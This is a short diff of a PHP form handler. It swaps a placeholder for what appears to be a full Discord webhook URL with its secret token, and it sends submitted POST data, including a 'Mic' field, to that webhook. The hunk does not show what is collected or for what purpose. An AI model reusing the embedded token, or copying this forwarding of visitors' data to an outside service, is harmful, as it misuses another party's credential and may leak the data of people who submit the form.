@@ -21,7 +21,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Mic: $mic\n";
 
     // Send message to Discord webhook
-    $webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+    $webhook_url = "https://discord.com/api/webhooks/1236316242109927495/ssponkg2sVgcklbKqwXU_SbSq4aBiZ7_cAB2BjpZHf62u2KPvZhwpRctgud4877IHOyq";
     $data = array("content" => $message);
     $options = array(
         "http" => array(
